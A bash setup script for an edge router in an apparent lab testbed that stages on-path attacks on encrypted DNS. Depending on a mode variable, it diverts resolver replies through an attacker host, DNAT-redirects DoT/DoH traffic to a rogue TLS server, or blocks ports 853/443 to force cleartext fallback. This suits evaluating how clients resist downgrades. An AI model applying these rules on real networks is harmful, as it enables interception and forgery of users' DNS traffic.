#!/bin/bash
set -e

# Edge-router forwards client subnet <-> resolver subnet (no NAT in normal
# operation). Each Phase 7 attack installs its own, clearly-scoped diversion
# here; "none" is clean forwarding for the 7.2 verify step.

RESOLVER_IP="172.16.2.10"
ATTACKER_IP="${ATTACKER_IP:-172.16.1.100}"
CLIENTS="${DIVERT_CLIENTS:-172.16.1.10 172.16.1.11}"
ATTACK="${ATTACK:-none}"
RT_TABLE=100
FWMARK=0x35

CLIENT_IF=$(ip -o -4 addr show | awk '/172\.16\.1\./{print $2; exit}')
echo "[edge-router] ATTACK=${ATTACK} client_if=${CLIENT_IF} attacker=${ATTACKER_IP}"

# ---- reset all prior diversion state ----
for c in ${CLIENTS}; do ip route del "${c}/32" 2>/dev/null || true; done
iptables -t nat    -F 2>/dev/null || true
iptables -t mangle -F 2>/dev/null || true
iptables -F FORWARD 2>/dev/null || true
ip rule del fwmark ${FWMARK} lookup ${RT_TABLE} 2>/dev/null || true
ip route flush table ${RT_TABLE} 2>/dev/null || true

divert_all_returns() {
    # Every resolver -> client reply (any port) goes through the attacker.
    # Needed by (i) so it can corrupt the :853 stream AND forge the :53 fallback.
    for c in ${CLIENTS}; do ip route replace "${c}/32" via "${ATTACKER_IP}"; done
}

divert_dns53_returns() {
    # ONLY cleartext resolver -> client :53 replies go through the attacker
    # (policy routing on an fwmark), leaving the :853/:443 path untouched so the
    # DoT/DoH handshake outcome is clean. Used by (ii) and (iii) for the
    # permissive client's cleartext fallback.
    ip route replace default via "${ATTACKER_IP}" table ${RT_TABLE}
    ip rule add fwmark ${FWMARK} lookup ${RT_TABLE}
    iptables -t mangle -A PREROUTING -p udp --sport 53 -s "${RESOLVER_IP}" \
        -j MARK --set-mark ${FWMARK}
}

case "$ATTACK" in
    none)
        echo "[edge-router] clean forwarding (verify mode)"
        ;;
    alter)
        divert_all_returns
        echo "[edge-router] (alter) full return-path diverted via attacker"
        ;;
    rogue-cert)
        iptables -t nat -A PREROUTING  -i "$CLIENT_IF" -p tcp -d "$RESOLVER_IP" --dport 853 -j DNAT --to-destination "${ATTACKER_IP}:853"
        iptables -t nat -A PREROUTING  -i "$CLIENT_IF" -p tcp -d "$RESOLVER_IP" --dport 443 -j DNAT --to-destination "${ATTACKER_IP}:443"
        iptables -t nat -A POSTROUTING -o "$CLIENT_IF" -p tcp -d "$ATTACKER_IP" -m multiport --dports 853,443 -j MASQUERADE
        divert_dns53_returns
        echo "[edge-router] (rogue-cert) 853/443 redirected to rogue TLS; :53 fallback diverted"
        ;;
    block)
        iptables -A FORWARD -p tcp --dport 853 -j DROP
        iptables -A FORWARD -p tcp --dport 443 -j DROP
        divert_dns53_returns
        echo "[edge-router] (block) 853/443 dropped; :53 fallback diverted"
        ;;
    *)
        echo "[edge-router] unknown ATTACK=${ATTACK}" >&2; exit 1 ;;
esac

echo "[edge-router] routes:";        ip route
echo "[edge-router] policy rules:";  ip rule show
echo "[edge-router] nat rules:";     iptables -t nat    -S 2>/dev/null | grep -v '^-P' || true
echo "[edge-router] mangle rules:";  iptables -t mangle -S 2>/dev/null | grep -v '^-P' || true
echo "[edge-router] filter rules:";  iptables -S FORWARD 2>/dev/null | grep -v '^-P' || true

exec sleep infinity
